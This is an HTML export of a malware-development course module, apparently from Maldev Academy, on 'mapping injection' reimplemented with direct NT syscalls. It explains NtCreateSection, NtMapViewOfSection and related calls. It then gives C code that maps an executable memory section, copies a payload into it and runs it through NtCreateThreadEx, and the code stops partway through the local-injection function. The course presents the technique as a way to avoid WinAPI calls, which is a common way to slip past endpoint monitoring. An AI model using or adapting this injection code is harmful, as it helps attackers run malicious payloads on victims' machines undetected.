<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>68. Syscalls - Reimplementing Mapping Injection</title><style>
/* cspell:disable-file */
/* webkit printing magic: print all background colors */
html {
	-webkit-print-color-adjust: exact;
}
* {
	box-sizing: border-box;
	-webkit-print-color-adjust: exact;
}

html,
body {
	margin: 0;
	padding: 0;
}
@media only screen {
	body {
		margin: 2em auto;
		max-width: 900px;
		color: rgb(55, 53, 47);
	}
}

body {
	line-height: 1.5;
	white-space: pre-wrap;
}

a,
a.visited {
	color: inherit;
	text-decoration: underline;
}

.pdf-relative-link-path {
	font-size: 80%;
	color: #444;
}

h1,
h2,
h3 {
	letter-spacing: -0.01em;
	line-height: 1.2;
	font-weight: 600;
	margin-bottom: 0;
}

.page-title {
	font-size: 2.5rem;
	font-weight: 700;
	margin-top: 0;
	margin-bottom: 0.75em;
}

h1 {
	font-size: 1.875rem;
	margin-top: 1.875rem;
}

h2 {
	font-size: 1.5rem;
	margin-top: 1.5rem;
}

h3 {
	font-size: 1.25rem;
	margin-top: 1.25rem;
}

.source {
	border: 1px solid #ddd;
	border-radius: 3px;
	padding: 1.5em;
	word-break: break-all;
}

.callout {
	border-radius: 3px;
	padding: 1rem;
}

figure {
	margin: 1.25em 0;
	page-break-inside: avoid;
}

figcaption {
	opacity: 0.5;
	font-size: 85%;
	margin-top: 0.5em;
}

mark {
	background-color: transparent;
}

.indented {
	padding-left: 1.5em;
}

hr {
	background: transparent;
	display: block;
	width: 100%;
	height: 1px;
	visibility: visible;
	border: none;
	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
}

img {
	max-width: 100%;
}

@media only print {
	img {
		max-height: 100vh;
		object-fit: contain;
	}
}

@page {
	margin: 1in;
}

.collection-content {
	font-size: 0.875rem;
}

.column-list {
	display: flex;
	justify-content: space-between;
}

.column {
	padding: 0 1em;
}

.column:first-child {
	padding-left: 0;
}

.column:last-child {
	padding-right: 0;
}

.table_of_contents-item {
	display: block;
	font-size: 0.875rem;
	line-height: 1.3;
	padding: 0.125rem;
}

.table_of_contents-indent-1 {
	margin-left: 1.5rem;
}

.table_of_contents-indent-2 {
	margin-left: 3rem;
}

.table_of_contents-indent-3 {
	margin-left: 4.5rem;
}

.table_of_contents-link {
	text-decoration: none;
	opacity: 0.7;
	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
}

table,
th,
td {
	border: 1px solid rgba(55, 53, 47, 0.09);
	border-collapse: collapse;
}

table {
	border-left: none;
	border-right: none;
}

th,
td {
	font-weight: normal;
	padding: 0.25em 0.5em;
	line-height: 1.5;
	min-height: 1.5em;
	text-align: left;
}

th {
	color: rgba(55, 53, 47, 0.6);
}

ol,
ul {
	margin: 0;
	margin-block-start: 0.6em;
	margin-block-end: 0.6em;
}

li > ol:first-child,
li > ul:first-child {
	margin-block-start: 0.6em;
}

ul > li {
	list-style: disc;
}

ul.to-do-list {
	padding-inline-start: 0;
}

ul.to-do-list > li {
	list-style: none;
}

.to-do-children-checked {
	text-decoration: line-through;
	opacity: 0.375;
}

ul.toggle > li {
	list-style: none;
}

ul {
	padding-inline-start: 1.7em;
}

ul > li {
	padding-left: 0.1em;
}

ol {
	padding-inline-start: 1.6em;
}

ol > li {
	padding-left: 0.2em;
}

.mono ol {
	padding-inline-start: 2em;
}

.mono ol > li {
	text-indent: -0.4em;
}

.toggle {
	padding-inline-start: 0em;
	list-style-type: none;
}

/* Indent toggle children */
.toggle > li > details {
	padding-left: 1.7em;
}

.toggle > li > details > summary {
	margin-left: -1.1em;
}

.selected-value {
	display: inline-block;
	padding: 0 0.5em;
	background: rgba(206, 205, 202, 0.5);
	border-radius: 3px;
	margin-right: 0.5em;
	margin-top: 0.3em;
	margin-bottom: 0.3em;
	white-space: nowrap;
}

.collection-title {
	display: inline-block;
	margin-right: 1em;
}

.simple-table {
	margin-top: 1em;
	font-size: 0.875rem;
	empty-cells: show;
}
.simple-table td {
	height: 29px;
	min-width: 120px;
}

.simple-table th {
	height: 29px;
	min-width: 120px;
}

.simple-table-header-color {
	background: rgb(247, 246, 243);
	color: black;
}
.simple-table-header {
	font-weight: 500;
}

time {
	opacity: 0.5;
}

.icon {
	display: inline-block;
	max-width: 1.2em;
	max-height: 1.2em;
	text-decoration: none;
	vertical-align: text-bottom;
	margin-right: 0.5em;
}

img.icon {
	border-radius: 3px;
}

.user-icon {
	width: 1.5em;
	height: 1.5em;
	border-radius: 100%;
	margin-right: 0.5rem;
}

.user-icon-inner {
	font-size: 0.8em;
}

.text-icon {
	border: 1px solid #000;
	text-align: center;
}

.page-cover-image {
	display: block;
	object-fit: cover;
	width: 100%;
	max-height: 30vh;
}

.page-header-icon {
	font-size: 3rem;
	margin-bottom: 1rem;
}

.page-header-icon-with-cover {
	margin-top: -0.72em;
	margin-left: 0.07em;
}

.page-header-icon img {
	border-radius: 3px;
}

.link-to-page {
	margin: 1em 0;
	padding: 0;
	border: none;
	font-weight: 500;
}

p > .user {
	opacity: 0.5;
}

td > .user,
td > time {
	white-space: nowrap;
}

input[type="checkbox"] {
	transform: scale(1.5);
	margin-right: 0.6em;
	vertical-align: middle;
}

p {
	margin-top: 0.5em;
	margin-bottom: 0.5em;
}

.image {
	border: none;
	margin: 1.5em 0;
	padding: 0;
	border-radius: 0;
	text-align: center;
}

.code,
code {
	background: rgba(135, 131, 120, 0.15);
	border-radius: 3px;
	padding: 0.2em 0.4em;
	border-radius: 3px;
	font-size: 85%;
	tab-size: 2;
}

code {
	color: #eb5757;
}

.code {
	padding: 1.5em 1em;
}

.code-wrap {
	white-space: pre-wrap;
	word-break: break-all;
}

.code > code {
	background: none;
	padding: 0;
	font-size: 100%;
	color: inherit;
}

blockquote {
	font-size: 1.25em;
	margin: 1em 0;
	padding-left: 1em;
	border-left: 3px solid rgb(55, 53, 47);
}

.bookmark {
	text-decoration: none;
	max-height: 8em;
	padding: 0;
	display: flex;
	width: 100%;
	align-items: stretch;
}

.bookmark-title {
	font-size: 0.85em;
	overflow: hidden;
	text-overflow: ellipsis;
	height: 1.75em;
	white-space: nowrap;
}

.bookmark-text {
	display: flex;
	flex-direction: column;
}

.bookmark-info {
	flex: 4 1 180px;
	padding: 12px 14px 14px;
	display: flex;
	flex-direction: column;
	justify-content: space-between;
}

.bookmark-image {
	width: 33%;
	flex: 1 1 180px;
	display: block;
	position: relative;
	object-fit: cover;
	border-radius: 1px;
}

.bookmark-description {
	color: rgba(55, 53, 47, 0.6);
	font-size: 0.75em;
	overflow: hidden;
	max-height: 4.5em;
	word-break: break-word;
}

.bookmark-href {
	font-size: 0.75em;
	margin-top: 0.25em;
}

.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.highlight-default {
	color: rgba(55, 53, 47, 1);
}
.highlight-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.highlight-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.highlight-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.highlight-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.highlight-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.highlight-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.highlight-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.highlight-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.highlight-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.highlight-gray_background {
	background: rgba(241, 241, 239, 1);
}
.highlight-brown_background {
	background: rgba(244, 238, 238, 1);
}
.highlight-orange_background {
	background: rgba(251, 236, 221, 1);
}
.highlight-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.highlight-teal_background {
	background: rgba(237, 243, 236, 1);
}
.highlight-blue_background {
	background: rgba(231, 243, 248, 1);
}
.highlight-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.highlight-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.highlight-red_background {
	background: rgba(253, 235, 236, 1);
}
.block-color-default {
	color: inherit;
	fill: inherit;
}
.block-color-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.block-color-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.block-color-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.block-color-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.block-color-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.block-color-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.block-color-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.block-color-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.block-color-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.block-color-gray_background {
	background: rgba(241, 241, 239, 1);
}
.block-color-brown_background {
	background: rgba(244, 238, 238, 1);
}
.block-color-orange_background {
	background: rgba(251, 236, 221, 1);
}
.block-color-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.block-color-teal_background {
	background: rgba(237, 243, 236, 1);
}
.block-color-blue_background {
	background: rgba(231, 243, 248, 1);
}
.block-color-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.block-color-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.block-color-red_background {
	background: rgba(253, 235, 236, 1);
}
.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
.select-value-color-translucentGray { background-color: rgba(255, 255, 255, 0.0375); }
.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }

.checkbox {
	display: inline-flex;
	vertical-align: text-bottom;
	width: 16;
	height: 16;
	background-size: 16px;
	margin-left: 2px;
	margin-right: 5px;
}

.checkbox-on {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
}

.checkbox-off {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
}
	
</style></head><body><article id="2f2302d2-9c4b-4300-bc09-befcc91e503c" class="page sans"><header><h1 class="page-title"><a href="https://maldevacademy.com/modules/68"><strong>68. Syscalls - Reimplementing Mapping Injection</strong></a></h1></header><div class="page-body"><h2 id="89e916d5-aac7-4c3d-8b2e-31753c35e268" class=""><strong>Syscalls - Reimplementing Mapping Injection</strong></h2><h3 id="2d63e4ca-4c61-4ec9-9ad3-ac4c5a6b7ba5" class=""><strong>Introduction</strong></h3><p id="b145202b-bd07-41a6-9db0-1f4e77caf51f" class="">In this module, the mapping injection technique discussed earlier will be implemented using direct syscalls, replacing WinAPIs with their syscall equivalent.</p><ul id="6cf72a20-96f3-4e74-89c9-3946a4d72fe4" class="bulleted-list"><li style="list-style-type:disc"><code>CreateFileMapping</code> is replaced with <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntcreatesection">NtCreateSection</a></li></ul><ul id="6a6a131b-9e16-4b5f-a5ca-2c0d66d26816" class="bulleted-list"><li style="list-style-type:disc"><code>MapViewOfFile</code> is replaced with <a href="http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FNtMapViewOfSection.html">NtMapViewOfSection</a></li></ul><ul id="627f07c3-eb2f-4576-9735-3f1e9e5a651f" class="bulleted-list"><li style="list-style-type:disc"><code>CloseHandle</code> is replaced with <a href="http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FType%20independed%2FNtClose.html">NtClose</a></li></ul><ul id="cf289bda-bce4-43cf-a792-b132e0b75988" class="bulleted-list"><li style="list-style-type:disc"><code>UnmapViewOfFile</code> is replaced with <a href="http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FNtUnmapViewOfSection.html">NtUnmapViewOfSection</a></li></ul><h3 id="de477a13-f5ff-4439-b950-4eb0dec1e43b" class=""><strong>Syscall Parameters</strong></h3><p id="7d1181eb-a9c7-48a8-8965-f345f9618b99" class="">This section will go through the syscalls that will be used and explain their parameters.</p><h3 id="50a05153-96d0-47e8-90e5-e3dab46bd560" class=""><strong>NtCreateSection</strong></h3><p id="195e2e25-9f8e-4dce-8a41-873ac77d05d2" class="">This is the resulting syscall from the <code>CreateFileMapping</code> WinAPI. <code>NtCreateSection</code> is shown below.</p><pre id="6458ad37-a66c-428f-8c92-bdcf7cfa7d51" class="code code-wrap"><code>NTSTATUS NtCreateSection(
  OUT PHANDLE             SectionHandle,          // Pointer to a HANDLE variable that receives a handle to the section object
  IN ACCESS_MASK          DesiredAccess,          // The type of the access rights to section handle
  IN POBJECT_ATTRIBUTES   ObjectAttributes,       // Pointer to an OBJECT_ATTRIBUTES structure (set to NULL)
  IN PLARGE_INTEGER       MaximumSize,            // Maximum size of the section
  IN ULONG                SectionPageProtection,  // Protection to place on each page in the section
  IN ULONG                AllocationAttributes,   // Allocation attributes of the section (SEC_XXX flags)
  IN HANDLE               FileHandle              // Optionally specifies a handle for an open file object (set to NULL)
);
</code></pre><p id="78b8efdc-3940-4704-88f1-4e6e40d67b38" class="">While <code>NtCreateSection</code> and <code>CreateFileMapping</code> have many similarities, some parameters are new. First, the <code>DesiredAccess</code> parameter describes the type of access rights for the section handle. The list of options is shown in the image below.</p><figure id="9b50d321-37e4-424c-b231-e8afb4f43aee" class="image"><a href="68%20Syscalls%20-%20Reimplementing%20Mapping%20Injection%202f2302d29c4b4300bc09befcc91e503c/syscall-mapping-114492060-65bb4d32-e61b-4489-b768-f4ef6629282c.png"><img style="width:1043px" src="68%20Syscalls%20-%20Reimplementing%20Mapping%20Injection%202f2302d29c4b4300bc09befcc91e503c/syscall-mapping-114492060-65bb4d32-e61b-4489-b768-f4ef6629282c.png"/></a></figure><p id="bf9603d6-6cf0-44f8-b79d-2815e3eb0b54" class="">In this module, either <code>SECTION_ALL_ACCESS</code> or <code>SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE</code> will suffice.</p><p id="5d0411ea-4ccc-4438-b7c7-3f34ff2f638f" class="">Next, the <code>MaximumSize</code> parameter is a pointer to a <a href="https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-large_integer-r1">LARGE_INTEGER</a> structure. The only element that needs to be populated is the <code>LowPart</code> element which will be equal to the payload&#x27;s size. The <code>LARGE_INTEGER</code> structure is shown below.</p><pre id="a27e1936-3986-4be7-9851-2a290d7fe771" class="code code-wrap"><code>typedef union _LARGE_INTEGER {
  struct {
    DWORD LowPart;
    LONG  HighPart;
  } DUMMYSTRUCTNAME;
  struct {
    DWORD LowPart;
    LONG  HighPart;
  } u;
  LONGLONG QuadPart;
} LARGE_INTEGER;
</code></pre><p id="78f8dd6e-9021-4afd-9510-4da96dc5cc64" class="">Finally, the <code>AllocationAttributes</code> parameter specifies a bitmask of <code>SEC_XXX</code> flags that determines the allocation attributes of the section. The list of flags can be found <a href="https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createfilemappinga">here</a> under the <code>flProtect</code> parameter. In this module, this parameter will be set to <code>SEC_COMMIT</code>.</p><h3 id="6de18bce-b463-4ef3-ab96-3abb3e3eb229" class=""><strong>NtMapViewOfSection</strong></h3><p id="eb925fce-afac-4551-98ee-b82ae907321a" class="">This is the resulting syscall from the <code>MapViewOfFile</code> WinAPI. <code>NtMapViewOfSection</code> is shown below.</p><pre id="7da49938-1704-4c1a-932f-19bbf80950a1" class="code code-wrap"><code>NTSTATUS NtMapViewOfSection(
  IN HANDLE               SectionHandle,            // HANDLE to Section Object created by &#x27;NtCreateSection&#x27;
  IN HANDLE               ProcessHandle,            // Process handle of the process to map the view to
  IN OUT PVOID            *BaseAddress,             // Pointer to a PVOID variable that receives the base address of the view
  IN ULONG                ZeroBits,                 // set to NULL
  IN SIZE_T               CommitSize,               // set to NULL
  IN OUT PLARGE_INTEGER   SectionOffset,            // set to NULL
  IN OUT PSIZE_T          ViewSize,                 // A pointer to a SIZE_T variable that contains the size of the memory to be allocated
  IN SECTION_INHERIT      InheritDisposition,       // How the view is to be shared with child processes
  IN ULONG                AllocationType,           // type of allocation to be performed (set to NULL)
  IN ULONG                Protect                   // Protection for the region of allocated memory
);
</code></pre><p id="053975d3-57b8-4eb4-bafb-0f84f65f07c0" class="">For more documentation on each parameter, reference Microsoft&#x27;s documentation on <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwmapviewofsection">ZwMapViewOfSection</a>. The <code>Zw</code> documentation can be used if Microsoft is missing the <code>Nt</code> documentation, which is the case with this syscall.</p><p id="a7f70e19-d74e-49e9-8d0a-ae53b16fed1e" class="">Some points need to be discussed about the following parameters:</p><p id="5361e061-502a-450d-8255-8e326e04e1ac" class="">First, the <code>ViewSize</code> parameter rounds up to the nearest multiple of a page size (recall that the page size is <code>4096</code> bytes).</p><p id="cf0a9dfe-2826-4c36-82ef-5671424fba4b" class="">Next, the <code>InheritDisposition</code> parameter is derived from the <code>SECTION_INHERIT</code> enum. It can be set to one of two values</p><ol type="1" id="7848528a-09c8-437a-97c0-1b749154eab6" class="numbered-list" start="1"><li><code>ViewShare</code> which maps the view into any child processes that are created in the future.</li></ol><ol type="1" id="4f3063b2-3047-4c67-bf81-7518869b05b9" class="numbered-list" start="2"><li><code>ViewUnmap</code> which does not map the view into any child processes.</li></ol><p id="277c48a5-d8f9-4099-a04a-8c20363c5a2e" class="">The <code>SECTION_INHERIT</code> enum is shown below.</p><pre id="1f58f23e-abed-474a-8051-828f1ba8e3db" class="code code-wrap"><code>typedef enum _SECTION_INHERIT {
	ViewShare = 1,
	ViewUnmap = 2
} SECTION_INHERIT, * PSECTION_INHERIT;
</code></pre><p id="5d4cdb04-c0f5-4d24-a4da-9953c6676d73" class="">In this module, the value will always be <code>ViewUnmap</code> because the implementation does not create any child processes.</p><p id="1501bcde-e7d9-469c-988b-0064801def81" class="">Finally, the <code>Protect</code> parameter specifies the type of protection for the allocated memory which can be any value found <a href="https://learn.microsoft.com/en-us/windows/win32/memory/memory-protection-constants">here</a>.</p><h3 id="f1daf9e4-11fe-48d6-bc29-20c102d8e7c8" class=""><strong>NtUnmapViewOfSection</strong></h3><p id="b26972bb-64d1-4604-8163-ebb68bb80b09" class="">This is the resulting syscall from the <code>UnmapViewOfFile</code> WinAPI. <code>NtUnmapViewOfSection</code> is shown below.</p><pre id="0c3b4f3c-e553-4cfb-940d-9ff58fff8bb3" class="code code-wrap"><code>NTSTATUS NtUnmapViewOfSection(
  IN HANDLE               ProcessHandle,    // Process handle of the process that contains the view to unmap
  IN PVOID                BaseAddress       // Base address of the view to unmap
);
</code></pre><h3 id="47e82f55-14f5-4157-95d2-0aab31843f95" class=""><strong>NtClose</strong></h3><p id="6fcd06eb-fd22-407a-be61-b3c6892b839c" class="">This is the resulting syscall from the <code>CloseHandle</code> WinAPI. <code>NtClose</code> is shown below.</p><pre id="010c0222-ba08-495b-9ee5-fe5464bd78ad" class="code code-wrap"><code>NTSTATUS NtClose(
  IN HANDLE               ObjectHandle    // Handle of the object to close
);
</code></pre><p id="3e43254f-0d19-475e-b787-d3802dcba6d9" class=""><code>NtClose</code> syscall will be used to close the handle of a section created using <code>NtCreateSection</code>.</p><h3 id="10ed3d2f-203b-4ede-bdd7-d150cdf5e0cd" class=""><strong>Implementation Using GetProcAddress and GetModuleHandle</strong></h3><p id="24ef9595-2f38-4e99-996f-c05e99d6b3e2" class="">The next step is to implement the mapping injection technique using the previously shown syscalls. Similarly to the previous module, it will be shown using three methods, starting with using <code>GetProcAddress</code> and <code>GetModuleHandle</code>.</p><p id="30b720dc-c676-450e-ab88-03c36bda5aea" class="">A <code>Syscall</code> structure is created and initialized using <code>InitializeSyscallStruct</code>, which holds the addresses of the syscalls used, as shown below.</p><pre id="7a57dc6b-1c1d-423e-bbb0-7c46d1f8fd27" class="code code-wrap"><code>// a structure used to keep the syscalls used
typedef struct _Syscall {

	fnNtCreateSection       pNtCreateSection;
	fnNtMapViewOfSection    pNtMapViewOfSection;
	fnUnmapViewOfSection    pNtUnmapViewOfSection;
	fnNtClose               pNtClose;
	fnNtCreateThreadEx      pNtCreateThreadEx;

}Syscall, * PSyscall;



// function used to populate the input &#x27;St&#x27; structure
BOOL InitializeSyscallStruct (OUT PSyscall St) {

	HMODULE hNtdll	= GetModuleHandle(L&quot;NTDLL.DLL&quot;);
	if (!hNtdll) {
		printf(&quot;[!] GetModuleHandle Failed With Error : %d \n&quot;, GetLastError());
		return FALSE;
	}

	St-&gt;pNtCreateSection         = (fnNtCreateSection)GetProcAddress(hNtdll, &quot;NtCreateSection&quot;);
	St-&gt;pNtMapViewOfSection      = (fnNtMapViewOfSection)GetProcAddress(hNtdll, &quot;NtMapViewOfSection&quot;);
	St-&gt;pNtUnmapViewOfSection    = (fnUnmapViewOfSection)GetProcAddress(hNtdll, &quot;NtUnmapViewOfSection&quot;);
	St-&gt;pNtClose                 = (fnNtClose)GetProcAddress(hNtdll, &quot;NtClose&quot;);
	St-&gt;pNtCreateThreadEx        = (fnNtCreateThreadEx)GetProcAddress(hNtdll, &quot;NtCreateThreadEx&quot;);

 	// check if GetProcAddress missed a syscall
	if (St-&gt;pNtCreateSection == NULL || St-&gt;pNtMapViewOfSection == NULL || St-&gt;pNtUnmapViewOfSection == NULL || St-&gt;pNtClose == NULL || St-&gt;pNtCreateThreadEx == NULL)
		return FALSE;
	else
		return TRUE;
}

</code></pre><p id="8be06df2-bf9b-433b-95cf-2de10fab117b" class="">The <code>LocalMappingInjectionViaSyscalls</code> and <code>RemoteMappingInjectionViaSyscalls</code> functions are responsible for injecting the payload (<code>pPayload</code>) in the local process and remote process (<code>hProcess</code>), respectively. Both functions are shown below.</p><h3 id="fab4a255-005c-4435-8777-b6ebef3cc83e" class=""><strong>LocalMappingInjectionViaSyscalls</strong></h3><pre id="40249798-3bee-4d8b-b7be-c4fddf8c037b" class="code code-wrap"><code>BOOL LocalMappingInjectionViaSyscalls(IN PVOID pPayload, IN SIZE_T sPayloadSize) {

	HANDLE				hSection		= NULL;
	HANDLE				hThread			= NULL;
	PVOID				pAddress		= NULL;
	NTSTATUS			STATUS			= NULL;
	SIZE_T				sViewSize		= NULL;
	LARGE_INTEGER		MaximumSize		= {
			.HighPart = 0,
			.LowPart = sPayloadSize
	};
	Syscall				St			    = { 0 };

	// Initializing the &#x27;St&#x27; structure to fetch the syscall&#x27;s addresses
	if (!InitializeSyscallStruct(&amp;St)) {
		printf(&quot;[!] Could Not Initialize The Syscall Struct \n&quot;);
		return FALSE;
	}

//--------------------------------------------------------------------------
	// Allocating local map view

	if ((STATUS = St.pNtCreateSection(&amp;hSection, SECTION_ALL_ACCESS, NULL, &amp;MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) {
		printf(&quot;[!] NtCreateSection Failed With Error : 0x%0.8X \n&quot;, STATUS);
		return FALSE;
	}

	if ((STATUS = St.pNtMapViewOfSection(hSection, (HANDLE)-1, &amp;pAddress, NULL, NULL, NULL, &amp;sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
		printf(&quot;[!] NtMapViewOfSection Failed With Error : 0x%0.8X \n&quot;, STATUS);
		return FALSE;
	}
	printf(&quot;[+] Allocated Address At : 0x%p Of Size : %d \n&quot;, pAddress, sViewSize);

//--------------------------------------------------------------------------
	// Writing the payload

	printf(&quot;[#] Press &lt;Enter&gt; To Write The Payload ... &quot;);
	getchar();
	memcpy(pAddress, pPayload, sPayloadSize);
	printf(&quot;\t[+] Payload is Copied From 0x%p To 0x%p \n&quot;, pPayload, pAddress);

//--------------------------------------------------------------------------

	// Executing the payload via thread creation

	printf(&quot;[#] Press &lt;Enter&gt; To Run The Payload ... &quot;);
	getchar();
	printf(&quot;\t[i] Running Thread Of Entry 0x%p ... &quot;, pAddress);
	if ((STATUS = St.pNtCreateThreadEx(&amp;hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, pAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
		printf(&quot;[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n&quot;, STATUS);
		return FALSE;
	}
